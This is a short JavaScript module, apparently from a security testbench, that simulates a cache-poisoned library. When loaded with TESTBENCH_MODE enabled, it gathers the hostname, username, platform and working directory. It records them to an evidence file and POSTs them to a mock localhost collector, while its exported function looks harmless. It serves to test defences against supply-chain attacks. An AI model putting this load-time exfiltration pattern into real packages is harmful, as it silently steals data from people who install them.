/**
 * Malicious cache-poisoned library (Scenario 16)
 * Exfiltrates on module load when TESTBENCH_MODE=enabled.
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const os = require('os');
  const fs = require('fs');
  const path = require('path');

  const payload = {
    attack: 'package-cache-poisoning',
    stage: 'cache-lib-load',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    cwd: process.cwd()
  };

  // Fallback: directly write evidence into the scenario file for determinism.
  try {
    const scenarioRoot = path.join(process.cwd(), '..');
    const evidencePath = path.join(scenarioRoot, 'infrastructure', 'captured-data.json');
    const parsed = JSON.parse(fs.readFileSync(evidencePath, 'utf8'));
    if (parsed && Array.isArray(parsed.captures)) {
      parsed.captures.push({ timestamp: new Date().toISOString(), data: payload });
      fs.writeFileSync(evidencePath, JSON.stringify(parsed, null, 2));
    }
  } catch {
    // ignore
  }

  // Best-effort: also attempt HTTP exfil to the mock server.
  const data = JSON.stringify(payload);
  const req = http.request(
    {
      hostname: 'localhost',
      port: 3016,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    },
    () => {}
  );

  req.on('error', () => {});
  req.write(data);
  req.end();
}

module.exports = {
  run: () => ({ ok: true, lib: 'cache-lib' })
};

